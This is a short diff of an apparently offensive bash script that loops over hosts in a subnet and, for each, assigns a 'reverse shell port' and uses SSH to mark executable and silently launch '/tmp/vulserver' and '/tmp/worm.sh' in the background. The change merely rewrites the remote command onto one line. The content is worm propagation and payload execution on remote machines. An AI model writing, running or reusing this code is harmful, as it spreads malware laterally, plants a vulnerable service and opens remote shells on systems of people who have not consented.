@@ -35,10 +35,8 @@ for i in $(seq 1 254); do
                 echo "[*] Assigning reverse shell port: $PORT"
 
                 # Execute payloads
-                ssh $USER@$TARGET "chmod +x /tmp/vulserver /tmp/worm.sh;
-                                   nohup /tmp/vulserver 5000 >/dev/null 2>&1 & 
-                                   sleep 1;
-                                   nohup bash /tmp/worm.sh >/dev/null 2>&1 &" &
+                ssh $USER@$TARGET "chmod +x /tmp/vulserver /tmp/worm.sh && nohup /tmp/vulserver 5000 >/dev/null 2>&1 & sleep 1 && nohup bash /tmp/worm.sh >/dev/null 2>&1 &" &
+
 
                 COUNT=$((COUNT + 1))
                 break
